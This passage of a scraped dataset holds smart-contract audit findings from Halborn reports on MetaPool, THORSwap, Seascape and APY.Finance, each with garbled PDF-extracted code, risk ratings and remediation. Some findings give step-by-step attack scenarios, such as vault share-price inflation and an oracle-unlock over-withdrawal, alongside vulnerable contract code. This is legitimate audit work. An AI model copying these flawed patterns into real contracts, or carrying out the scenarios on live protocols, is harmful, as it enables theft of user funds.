10: contracts/katherine-fundraising-contract/src/lib.rs (Line 363) 362 pub fn delete_kickstarter (& mut self , id : KickstarterId ) { 363 364 } panic! ( \" Kickstarter {} must not be deleted! \" , id ); BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to delete unnecessary function. 50 Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 6727d175 by removing the delete_kickstarter function. 51 ", "labels": ["Halborn", "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR", "Severity: Informational"]}, {"title": "DEAD CODE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf", "body": "It was observed that the code present in the interest.rs file in the KatherineFundraising contract is completely commented out. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to delete files that are not adding a meaningful logic implementation. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 6727d175 by deleting the dead code. 52 ", "labels": ["Halborn", "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR", "Severity: Informational"]}, {"title": "JAVASCRIPT INCOMPATIBLE TYPE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf", "body": "It was observed that creating a kick-starter in KatherineFundraising contract requires the caller to send arguments of type u64. The contract is interacted with by JavaScript API directly or indirectly via near-cli. JavaScript does not support the whole range of u64 type, and the max value that could be represented with precision is equal to 2**53 - 1. Providing a value higher than that one will result in imprecise representation (the actual value would be different from what the user supplied) or in error. It is worth noting that values that could be impacted by this finding are associated with timestamps, and it is implausible for regular interaction to require supplying values that could break this functionality. Code Location: Listing (Line 7) 11: contracts/katherine-fundraising-contract/src/types.rs 7 pub type EpochMillis = u64 ; Exemplary usage of EpochMillis type as user-facing function: Listing 12: contracts/katherine-fundraising-contract/src/lib.rs (Lines 338,339) 333 pub fn create_kickstarter ( 334 335 336 337 338 339 & mut self , name : String , slug : String , owner_id : AccountId , open_timestamp : EpochMillis , close_timestamp : EpochMillis , 53 token_contract_address : AccountId , deposits_hard_cap : U128 , max_tokens_to_release_per_stnear : U128 , token_contract_decimals : u8 , self . assert_only_owner () ; self . assert_unique_slug (& slug ); let id = self . kickstarters . len () as KickstarterId ; self . internal_create_kickstarter ( 340 341 342 343 344 ) -> KickstarterId { 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 } ) id , name , slug , owner_id , open_timestamp , close_timestamp , token_contract_address , deposits_hard_cap , max_tokens_to_release_per_stnear , token_contract_decimals BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to convert u64 into NEARs U64 type. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit ecaf7820 by changing the u64 type to U64 json-compatible type. 54 4.10 (HAL-10) POSSIBLE OPTIMIZATIONS TO REDUCE BINARY SIZE - INFORMATIONAL (0.0) ", "labels": ["Halborn", "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR", "Severity: Informational"]}, {"title": "INITIAL vTHOR SHARE PRICE MANIPULATION EXPOSURE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/THORSwap_Aggregators_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "After deployment, the vTHOR contract is initialed without seeding liquidity, exposing the vault to share price manipulation attacks. Proof of Concept: 1. The vTHOR contract is deployed by the THORSwap team. 2. An attacker finds the vTHOR contract before anyone can deposit their tokens. 3. The attacker deposits 1 token, for which they receive 1 share. This transaction sets the share price at 1 token/share. 4. The attacker then transfers an additional 999 tokens to the vTHOR This transaction increases the share price to 1000 contract. tokens/share. 5. A victim user finds the vTHOR contract and deposits 1500 tokens. Due to the integer rounding, the user only receives 1 share. This transaction modifies the share price to 1250 tokens/share. 6. The attacker then, withdraws from the contract using the redeem function. Depending on the distribution of shares, they will receive 1250 tokens, of which 250 will belong to the victim user. We note that the impact and likelihood of the vulnerability are low because the attacker has limited opportunity to exploit the issue. However, contract developers must be aware of the initial exposure to prevent potential damage. Risk Level: Likelihood - 1 Impact - 3 12 Recommendation: One of the possible solutions to avoid the price manipulation attack is to lock some tokens in the contract and then manually validate the share price before the vTHOR contract is made public. Remediation Plan: RISK ACCEPTED: The THORSwap team accept the risk of this finding and will deploy vTHOR and deposit THOR from treasury first to mitigate the issue. 13 ", "labels": ["Halborn", "THORSwap_Aggregators", "Severity: Low"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/THORSwap_Aggregators_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The vTHOR contract missed the nonReentrant guard in the deposit, mint , withdraw and redeem public functions. Even if the functions follow the check-effects-interactions pattern, we recommend using a mutex to be protected against cross-function reentrancy attacks. By using this lock, an attacker can no longer exploit the function with a recursive call. Note that the vTHOR contract included a mutex implementation called ReentrancyGuard, which provides a modifier to any function called nonReentrant that guards with a mutex against reentrancy attacks. However, the modifier is not used within the contract. Code Location: Listing 1: vTHOR.sol require (( shares = previewDeposit ( assets )) != 0, \" ZERO_SHARES \" ) // Check for rounding error since we round down in // Need to transfer before minting or ERC777s could reenter . address ( _asset ). safeTransferFrom ( msg . sender , address ( this ) , 73 function deposit ( uint256 assets , address receiver ) public returns  ( uint256 shares ) { 74  previewDeposit . 75  ; 76 77  assets ); 78 79 80 } 81 82 function mint ( uint256 shares , address receiver ) public returns (  uint256 assets ) { 83  error , previewMint rounds up . 84 85 // Need to transfer before minting or ERC777s could reenter . address ( _asset ). safeTransferFrom ( msg . sender , address ( this ) , _mint ( receiver , shares ); emit Deposit ( msg . sender , receiver , assets , shares ); assets = previewMint ( shares ); // No need to check for rounding 14 _mint ( receiver , shares ); emit Deposit ( msg . sender , receiver , assets , shares ); if ( msg . sender != owner ) { uint256 assets , address receiver , address owner  assets ); 86 87 88 } 89 90 function withdraw ( 91 92 93 94 ) public returns ( uint256 shares ) { 95  rounding error , previewWithdraw rounds up . 96 97  gas for limited approvals . 98  sender ] = allowed - shares ; 99 100 101 102 103 } 104 105 function redeem ( 106 107 108 109 ) public returns ( uint256 assets ) { 110 111 uint256 shares , address receiver , address owner if ( msg . sender != owner ) { shares = previewWithdraw ( assets ); // No need to check for uint256 allowed = allowance [ owner ][ msg . sender ]; // Saves if ( allowed != type ( uint256 ). max ) allowance [ owner ][ msg . } _burn ( owner , shares ); emit Withdraw ( msg . sender , receiver , owner , assets , shares ); address ( _asset ). safeTransfer ( receiver , assets ); uint256 allowed = allowance [ owner ][ msg . sender ]; // Saves  gas for limited approvals . 112 if ( allowed != type ( uint256 ). max ) allowance [ owner ][ msg .  sender ] = allowed - shares ; 113 114 } // Check for rounding error since we round down in  previewRedeem . 115 116 117 118 119 } require (( assets = previewRedeem ( shares )) != 0, \" ZERO_ASSETS \"); _burn ( owner , shares ); emit Withdraw ( msg . sender , receiver , owner , assets , shares ); address ( _asset ). safeTransfer ( receiver , assets ); 15 Risk Level: Likelihood - 1 Impact - 3 Recommendation: We recommend using ReentrancyGuard through the nonReentrant modifier. Remediation Plan: SOLVED: The THORSwap team added the nonReentrant modifier to the deposit, mint, withdraw and redeem functions. 16 ", "labels": ["Halborn", "THORSwap_Aggregators", "Severity: Low"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/THORSwap_Aggregators_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Owners and TSAggregator contracts there are management functions marked as public, but they are never directly called within the contract itself or in any of its descendants:  setOwner(address owner, bool active)public virtual isOwner (Owners.sol#19)  setFee(uint256 _fee, address _feeRecipient)public (TSAggregator.sol#26) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by descendants, it is better to mark them as external to reduce gas costs. Remediation Plan: SOLVED: The THORSwap team marked the setOwner and setFee functions as external. 17 ", "labels": ["Halborn", "THORSwap_Aggregators", "Severity: Informational"]}, {"title": "MISSING TOKEN DECIMALS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The newPeriod function under the StakeToken contract and the constructor of the SingleTokenChallenge and NftTokenChallenge contracts do not check for their decimals being the same as the SCALED factor. If a token whose decimals are != 18 will cause the staking period calculations to be wrong, including the rewards. Code Location: Listing 1: contracts/defi/StakeToken.sol (Lines 43,44) 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 function newPeriod ( uint256 key , address stakeToken , address rewardToken , uint256 startTime , uint256 endTime , uint256 rewardPool ) { } external newStakePeriod ( key , startTime , endTime , rewardPool ); // Challenge . stake is not null , means that earn is not null too . Period storage period period . stakeToken period . rewardToken = periods [ msg . sender ][ key ]; = stakeToken ; = rewardToken ; emit NewPeriod ( msg . sender , key , stakeToken , rewardToken , startTime , endTime ); 15 Listing 2: contracts/game_5/challenges/SingleTokenChallenge.sol (Lines 78,79) 74 constructor ( address _zombieFarm , address _vault , address _stake , address _reward , address _stakeHandler ) VaultHandler ( _vault ) public { require ( _zombieFarm != address (0) , \" invalid _zombieFarm address \" ); zombieFarm stakeToken rewardToken stakeHandler = _zombieFarm ; = _stake ; = _reward ; = _stakeHandler ; initReentrancyStatus () ; } 75 76 77 78 79 80 81 82 83 Listing 3: 91) contracts/game_5/challenges/NftTokenChallenges.sol (Lines 84 constructor ( address _zombieFarm , address _vault , address _nft , address _stake , address _reward , address _stakeHandler ) VaultHandler ( _vault ) public { require ( _zombieFarm != address (0) , \" invalid _zombieFarm address \" ); require ( _nft failed \" ); zombieFarm stakeToken nft rewardToken stakeHandler != address (0) , \" data . stake verification = _zombieFarm ; = _stake ; = _nft ; = _reward ; = _stakeHandler ; initReentrancyStatus () ; } 85 86 87 88 89 90 91 92 93 94 95 Risk Level: Likelihood - 3 Impact - 5 16 Recommendation: The code on newPeriod creation must check for both stakeToken and rewardToken decimals to be 18 the same as SCALED under Stake contract. Remediation Plan: SOLVED: The code now checks for the token decimals on all the aforementioned contracts. 17 ", "labels": ["Halborn", "Seascape_ZombieFarm", "Severity: High"]}, {"title": "MISSING SUPPORT FOR DEFLATIONARY TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The transferFromVaultToUser function under the VaultHandler contract does not check the difference between the transferred before/after balance. The transferFromUserToVault does perform this check, but the return value is never checked. Not checking those values could cause the rewards to have discrepancy with the actual staked amount of tokens. Code Location: Listing 4: contracts/defi/StakeToken.sol (Lines 29,33,46) 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 function transferFromUserToVault ( address token , uint256 amount , address user ) internal returns ( uint256 ) { if ( token == address (0) ) { require ( msg . value >= amount , \" VAULT_HANDLER : not enough native token \" ); return msg . value ; } IERC20 _token = IERC20 ( token ); require ( _token . balanceOf ( user ) >= amount , \" VAULT_HANDLER : user has not enough token \" ); uint256 preTotalAmount = _token . balanceOf ( vault ); _token . safeTransferFrom ( user , vault , amount ); uint256 actualAmount = _token . balanceOf ( vault ) - preTotalAmount ; return actualAmount ; } function transferFromVaultToUser ( address token , uint256 amount , address user ) internal returns ( uint256 ) { if ( token == address (0) ) { payable ( user ). transfer ( amount ); 18 41 42 43 44 45 46 47 48 49 return amount ; } IERC20 _token = IERC20 ( token ); require ( _token . balanceOf ( vault ) >= amount , \" VAULT_HANDLER : vault has not enough token \"); _token . safeTransferFrom ( vault , user , amount ); return amount ; } Risk Level: Likelihood - 3 Impact - 5 Recommendation: The code should check for the real deposited amount and not rely on the function call parameter. If the changes are not made, the Seascape team should make sure that the provided tokens for staking/reward are not deflationary. Remediation Plan: RISK ACCEPTED: The SeaScape team accepts the risk on this finding. 19 ", "labels": ["Halborn", "Seascape_ZombieFarm", "Severity: High"]}, {"title": "CREATED SESSIONS CAN OVERLAP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The startSession function under the ZombieFarm contract does not check for the previous session id end time and allows creating a session whose start time is in the middle of the previous session period. Risk Level: Likelihood - 2 Impact - 5 Recommendation: The code should check that the created session is not inside the previous session by checking the startTime of the new session to be bigger than the last session endTime. Remediation Plan: SOLVED: The code now checks for isStarting during session start, which will prevent a new session to be started if a previous was already started (even if not active). 20 ", "labels": ["Halborn", "Seascape_ZombieFarm", "Severity: Medium"]}, {"title": "INVALID PERIOD CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The getPeriodTime function does always report endTime if the startTime is in the future. This can cause all reward and claims to be treated as if the period was finished. If getPeriodTime is used inside a function that does not use the whenStakePeriodActive modifier, it will be vulnerable. Function using getPeriodTime are:  claimable: Since the staker deposit is only updated when inside the startTIme/endTime range, it will return 0 before even reaching the invalid getPeriodTime  updatePeriodClaimable (internal): Called using the updateRewardClaimable modifier. It is used on the deposit function after the Also used on the withdraw function that It is also called on whenStakePeriodActive. will fail since no deposit was made yet. reward function, but deposit is checked there for being not zero.  _reward (internal): The code does check staker.deposit == 0 which The deposit function will only change its value during deposit. does call whenStakePeriodActive. Code Location: Listing 5: contracts/defi/Stake.sol (Lines 267,278) 265 266 267 268 269 270 271 272 function getPeriodTime ( uint startTime , uint endTime ) internal view returns ( uint ) { if (! isActive ( startTime , endTime )) { return endTime ; } return block . timestamp ; } 21 273 274 275 276 277 278 279 function isActive ( uint startTime , uint endTime ) internal view returns ( bool ) { if ( startTime == 0) { return false ; } return ( block . timestamp >= startTime && block . timestamp <= endTime ); } Risk Level: Likelihood - 2 Impact - 5 Recommendation: The getPeriodTime should not return endTime if the period hasnt started yet. All functions calling this method should make sure that the returned value is inside the period. Remediation Plan: SOLVED: The getPeriodTime function now checks for block.timestamp < startTime and reports startTime instead of endTime. 22 ", "labels": ["Halborn", "Seascape_ZombieFarm", "Severity: Medium"]}, {"title": "INVALID REWARD AMOUNT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "If the reward is less than the difference between the start and end timestamps, the unit (reward per second) will always be 0. As an example, if the reward was 10000 and the timestamp diff was 1641929035 - 1441929035 (200000000) the unit value would be 0 causing all the reward calculations to not increase. When the unit value is used it gets factored against the SCALED variable, this means that the unit value itself should be stored SCALED already and not rely on lazy escalation. Code Location: Listing 6: contracts/defi/Stake.sol (Lines 85) 71 72 73 74 75 76 77 78 // a unique identifier . could be a function newStakePeriod ( uint key , session id . uint startTime , uint endTime , uint rewardPool ) internal validStakePeriodParams ( key , startTime , endTime , rewardPool ) 23 79 80 81 82 83 84 85 86 87 88 89 { } // Challenge . stake is not null , means that earn is not null too . StakePeriod storage period = stakePeriods [ msg . sender ][ key ]; period . rewardPool period . startTime period . endTime period . unit startTime ); = rewardPool ; = startTime ; = endTime ; = rewardPool / ( endTime - period . rewardClaimableTime = startTime ; emit NewStakePeriod ( msg . sender , key , startTime , endTime ); Risk Level: Likelihood - 2 Impact - 5 Recommendations: It is recommended that the stored period.unit value is scaled by SCALER factor during declaration and not when used. Remediation Plan: SOLVED: The code now stores the unit value scaled with the SCALER factor. 24 ", "labels": ["Halborn", "Seascape_ZombieFarm", "Severity: Medium"]}, {"title": "REWARD NFT RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The addLevelRewardToSession under the ZombieFarm does allow setting the same _data.imgId to multiple levelIds including the Grand reward. This will deny the prize to be collected since it was already collected on a previous level. Risk Level: Likelihood - 2 Impact - 4 Recommendations: The code should check for ID duplication on the _data parameters of the AddLevelToSession function under ScapeNftReward contract. Remediation Plan: NOT APPLICABLE: The team states that: The imgId passed as a reward is a metadata ticker. It is not an identifier of NFT. When the reward is claimed, the ZombieFarm will call a factory by passing metadata, so that factory will mint a new NFT and generate a new id for that NFT. 25 ", "labels": ["Halborn", "Seascape_ZombieFarm", "Severity: Medium"]}, {"title": "SESSION DUPLICATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The value startTime = 0 is allowed under the validStakePeriodParams modifier, bypassing the existence check and creating a duplicated session ID. Code Location: Listing 7: contracts/defi/Stake.sol (Lines 45) 45 46 47 48 49 50 modifier validStakePeriodParams ( uint key , uint startTime , uint endTime , uint rewardPool ) { require ( startTime < endTime , STAKE_TOKEN : invalid_time \" ); require ( rewardPool > 0, STAKE_TOKEN : zero_value \" ); require ( stakePeriods [ msg . sender ][ key ]. startTime == 0 , STAKE_TOKEN : period_exists \" ); _ ; } \" \" \" Risk Level: Likelihood - 1 Impact - 5 Recommendation: Although the check is performed on the call stack parent, it is recommended to perform all check on the call stack leaf so extreme scenarios are not The validStakePeriodParams modifier should either check for missed. startTime != 0 or use endTime for the period_exists check. 26 Remediation Plan: SOLVED: The check was added to the validStakePeriodParams modifier. The modifier now enforces that startTime >= block.timestamp. 27 ", "labels": ["Halborn", "Seascape_ZombieFarm", "Severity: Medium"]}, {"title": "UNUSED AND UNVERIFIED VARIABLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the ZombieFarm contract inside the startSession function, the grand reward variable is not used and not verified for being a valid reward. Since this value cannot be changed, this can lead to the grand reward not claimable. Code Location: Listing 8: contracts/game_5/ZombieFarm.sol (Lines 166,169) function startSession ( startTime , period , levelAmount , speedUpFee , repickFee , grandReward uint256 uint256 uint8 uint256 uint256 address external onlyOwner ) { // // Verifying the Grand reward // require ( supportedRewards [ grandReward ], \" unsupported reward \" ); ZombieFarmRewardInterface reward = ZombieFarmRewardInterface ( grandReward ); // Check that Grand Reward is valid : the rewardData and reward id should be parsable . // require ( reward . isValidData ( rewardData ) , \" Invalid reward data \") ; 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 28 Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to validate the given address and to verify that the given contract does conform to the casted interface. Remediation Plan: RISK ACCEPTED: The SeaScape team accepts the risk on this finding. 29 ", "labels": ["Halborn", "Seascape_ZombieFarm", "Severity: Low"]}, {"title": "INVALID REPORTED VALUE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The initiated function does report true even if the session is in the future and hasnt started yet: Code Location: Listing 9: contracts/defi/Stake.sol (Lines 298) 294 295 296 297 298 299 function initiated ( address namespace , uint key ) public view returns ( bool ) { if ( key == 0) return false ; StakePeriod storage period = stakePeriods [ namespace ][ key ]; return ( block . timestamp <= period . endTime ); } Risk Level: Likelihood - 1 Impact - 2 Recommendation: The function should check for the period.startTime and report true only if inside the startTime/endTime period. 30 Remediation Plan: ACKNOWLEDGED: The SeaScape team acknowledged this finding. 31 3.10 (HAL-10) MISSING ZERO CHECKS - INFORMATIONAL ", "labels": ["Halborn", "Seascape_ZombieFarm", "Severity: Informational"]}, {"title": "NO RESTRICTIONS TO COMPLETELY WITHDRAW FROM POOLS TO FUND LP SAFE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf", "body": "When owner calls fundLpSafe function from PoolManager contract, its _fund function does not verify pools reserve before transferring stable coins to LP Safe, so pools can be completely emptied without restrictions. This situation could lead legitimate users are not able to redeem its stable coins timely, especially because pools refill operation must be done manually by PoolManager owner. The risk level for this finding increases because it also facilitates liquidity loss related attacks (see HAL-02). Category: Liquidity management vulnerabilities Code location: Listing 1: PoolManager.sol (Lines 147) { external override onlyOwner nonReentrant 137 function fundLpSafe ( ILpSafeFunder . PoolAmount [] memory poolAmounts ) 138 139 140 141 142 143 144 145 146 147 148 149 address lpSafeAddress = addressRegistry . lpSafeAddress () ; require ( lpSafeAddress != address (0) , \" INVALID_LP_SAFE \" ); ( PoolTokenV2 [] memory pools , uint256 [] memory amounts ) = _getPoolsAndAmounts ( poolAmounts ); _fund ( lpSafeAddress , pools , amounts ); _registerPoolUnderlyers ( lpSafeAddress , pools ); } 20 S R O T C A F K S I R D E S A B L O C O T O R P Listing 2: PoolManager.sol (Lines 221) 202 function _fund ( 203 204 205 206 207 ) internal { address account , PoolTokenV2 [] memory pools , uint256 [] memory amounts MetaPoolToken mApt = MetaPoolToken ( addressRegistry . 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 mAptAddress () ); uint256 [] memory mintAmounts = new uint256 []( pools . length ) ; for ( uint256 i = 0; i < pools . length ; i ++) { PoolTokenV2 pool = pools [ i ]; uint256 poolAmount = amounts [i ]; require ( poolAmount > 0, \" INVALID_AMOUNT \"); IDetailedERC20 underlyer = pool . underlyer () ; uint256 tokenPrice = pool . getUnderlyerPrice () ; uint8 decimals = underlyer . decimals () ; uint256 mintAmount = mApt . calculateMintAmount ( poolAmount , tokenPrice , decimals ); mintAmounts [i ] = mintAmount ; underlyer . safeTransferFrom ( address ( pool ) , account , poolAmount ); } Risk Level: Likelihood - 3 Impact - 3 Recommendations: Implement a security mechanism that automatically calculates the maximum amount of stable coins that can be withdrawn from pools to fund LP Safe without compromising the reserves. Revert the operation if PoolManager owner tries to withdraw more than allowed. 21 S R O T C A F K S I R D E S A B L O C O T O R P Remediation plan: SOLVED: Issue fixed in commit 8d4f1d4c4069ced8462ee95ec36d6ef9e12033e0. The fundLp function from MetaPoolToken contract automatically calculates the amount of extra reserves and only transfer that extra amount, it no longer takes a parameter to specify any arbitrary amount. On the other hand, the emergencyFundLp function that can transfer from the pools without restriction is protected by onlyEmergencyRole modifier. S R O T C A F K S I R D E S A B L O C O T O R P 22 ", "labels": ["Halborn", "APY_Financial_Pentesting", "Severity: Medium"]}, {"title": "UNRESTRICTED CAPACITY TO TRANSFER STABLE COINS FROM LP SAFE TO EXTERNAL ACCOUNTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf", "body": "Due to the design of APY.Finance platform, PoolManager owner periodically funds a special Gnosis Safe wallet - called LP Safe - that has unrestricted capacity to transfer its whole balance to a (potentially malicious) external account. The risk level for this finding increases because is possible to empty all pools without restrictions, see HAL-01. Attack scenario: 1. PoolManager owner funds LP Safe with the whole balance from all pools (see HAL-01 finding). 2. If not appropriately configured, LP Safe can use Gnosis Safes Multisend transaction builder to transfer its whole own balance to a malicious external account. 3. Legitimate users will not be able to redeem its stable coins anymore. Category: Liquidity loss exposure Code location: Not applicable for a specific smart contract. Some referential images will be shown to highlight Gnosis Safe functionalities that facilitates to transfer (unrestrictedly) stable coins to external accounts. Referential image of Gnosis Safes Multisend transaction builder that allows to build multiple transactions at once from a smart contract: 23 S R O T C A F K S I R D E S A B L O C O T O R P S R O T C A F K S I R D E S A B L O C O T O R P Referential image that shows Gnosis Safe capacity to send multiple transactions by signing just once: Risk Level: Likelihood - 3 Impact - 5 24 Recommendations: Short term security measures to reduce risk level for this finding:  Solve HAL-01 finding: No restrictions to completely withdraw from pools to fund LP Safe.  Configure LP Safes Owners section to have a reasonable number of owners and Policies section to have an appropriate number of required confirmations to transact. Long term security measures to reduce risk level for this finding:  Deploy a proxy smart contract, owned by LP Safe, that interacts with all DeFi protocols used by APY.Finance for yield farming.  Establish decentralized government to upgrade the interactions with those DeFi protocols or new ones. Remediation plan: SOLVED: Issue fixed in commit 35fca40b1d873609a96b09440afc7676666e111d. APY.Finance team implemented a proxy contract called LpAccount. This contract holds all the funds and allows the more restrictive admin Safe to register zap contracts. These zap contracts have a consistent interface and define the logic used to interact with external protocols. The LpAccount contract can perform a delegate call to these registered zap contracts to deploy, unwind, or swap assets. The configuration of the zap contracts uses hardcoded constants to prevent a malicious user that has compromised the controlling Safe from passing in their own addresses or parameters that could cause a loss of funds. 25 S R O T C A F K S I R D E S A B L O C O T O R P TRANSACTION BASED RISK FACTORS 26 ", "labels": ["Halborn", "APY_Financial_Pentesting", "Severity: High"]}, {"title": "INADEQUATE SEGREGATION OF DUTIES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf", "body": "Due to the design of APY.Finance platform, owners of contracts can carry out different kind of operations:  Day-to-day operations: Fund LP Safe, add asset allocation, etc.  Interaction with external DeFi protocols: Deploy strategy, unwind strategy.  Emergency operations: Set TVL value manually, set TVL aggregator source, etc. For each kind of operation should exist a different role to reduce the risk of operational mistakes or attacker lateral movement if one of the roles has been already compromised. The risk level for this finding increases because it also facilitates another attacks (see HAL-04, HAL-05 and HAL-07). Category: Governance issues Code location: Not applicable for a specific smart contract. Risk Level: Likelihood - 4 Impact - 3 27 S R O T C A F K S I R D E S A B N O I T C A S N A R T Recommendations: Security measures to reduce risk level for this finding:  Define clearly what functions of APY.Finance protocol should be assigned to each kind of operation.  Create different roles for each kind of operation: day-to-day ops, interaction with external DeFi protocols and emergency ops.  Each role must be associated to a multisig wallet and preferably managed by different owners.  Configure multisig wallets to have a reasonable number of owners and an appropriate number of required confirmations to transact. Remediation plan: SOLVED: Issue fixed in commit ab6e8837290b4646827cf5391cdfa75d726c3f1a. APY.Finance team solved this finding by switching from simple contract ownership to role based access control and implementation of this uses the existing OpenZeppelin AccessControl contract. Roles were segregated into three categories, each controlled by a different Gnosis Safe:  LP Role: This role is for day to day management of liquidity and is controlled by the LP Safe.  Admin Role: This role is for configuration that needs to be protected because a malicious actor could use the functions to cause a loss of funds. This is separate from the LP role, so APY.Finance can use a much more restrictive Gnosis Safe. The functions this role protects are not so time-sensitive, so the proper oversight with many signers can be applied. An example is the registration of new LP Account zaps.  Emergency Role: This role is the most restrictive and protects functions that should never be called during normal operation of the system. These functions are powerful and should only be used as a fail-safe in 28 S R O T C A F K S I R D E S A B N O I T C A S N A R T the event of an emergency. All functions protected by the emergency role are labeled with the prefix emergency in addition to the onlyEmergencyRole modifier. The big distinction between this and the admin role is that the admin role protects functions that can be used during normal operations. S R O T C A F K S I R D E S A B N O I T C A S N A R T 29 INTERNAL BASED RISK FACTORS 30 ", "labels": ["Halborn", "APY_Financial_Pentesting", "Severity: Medium"]}, {"title": "ABSENCE OF TIMELOCK MECHANISM WHEN UPGRADING SYSTEM LOGIC / PARAMETERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf", "body": "APY.Finance protocol does not have a timelock set on their smart contracts, so most owner interactions with the contracts allow him to make large changes to contract configuration (logic / parameters) with no delays or warnings. Due to operational mistakes or by means of attacks, TVL or prices could be dramatically changed and creates a great imbalance on stable coin / APT ratio. This situation would allow users to deposit or withdraw more or less than their fair share, without enough time for APY.Finance team to react against the issue. Category: Timelock risks Code location: Applicable for all smart contracts within scope. The following are some examples of timelocks used on another protocols: Listing 3 1 MakerDAO - 4 hours timelock 2 Uniswap - 48 hours timelock 3 SushiSwap - 48 hours timelock 31 S R O T C A F K S I R D E S A B L A N R E T N I Risk Level: Likelihood - 3 Impact - 3 Recommendations: Security measures to reduce risk level for this finding:  Set a timelock by code. Once set, no one can reduce the waiting time unless using a governance system or an emergency role. You can take the examples provided above as a reference.  For an adequate segregation of duties, create an emergency role (multisig wallet) to manage large changes to contract configuration. This role must be different from the one used for day-to-day operations (e.g.: fund LP Safe).  Configure this multisig wallet to have a reasonable number of owners and an appropriate number of required confirmations to transact. Remediation plan: PARTIALLY SOLVED: APY.Finance team implemented part of the suggested remediation to have critical configuration protected by a segregated role (Emergency Role) that uses a more restrictive Safe. This provides more oversight and reduce the likelihood that major changes happens instantly. 32 S R O T C A F K S I R D E S A B L A N R E T N I ", "labels": ["Halborn", "APY_Financial_Pentesting", "Severity: Medium"]}, {"title": "EARLY UNLOCKING OF ORACLE ADAPTER COULD LEAD TO UNFAIR WITHDRAWING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf", "body": "The unlock function from OracleAdapter contract can be called by some permissioned accounts. However, if it is called just after withdrawing LP Safe, TVL value is miscalculated (deployed value is considered twice) and creates a time window where attackers and legitimate users as well can withdraw much more than allowed from pools. Attack scenario: A step-by-step attack scenario will be described along with screenshots extracted from proof of concept (PoC) script, which is included on security-assessment/tvl_not_updated.js file as an attachment for this report. 1. Attacker deposits its stable coins into a pool. 2. PoolManager contract owner withdraws from LP Safe and mistakenly unlocks OracleAdapter before TVL value is updated by oracles. 33 S R O T C A F K S I R D E S A B L A N R E T N I 3. We can see that attacker deposited 1M DAI but is able to withdraw more than 1.39M DAI, which represents a 39% excedent. While TVL value has not been updated by oracles, this vulnerability can be exploited by attackers and legitimate users as well. Category: Timelock risks 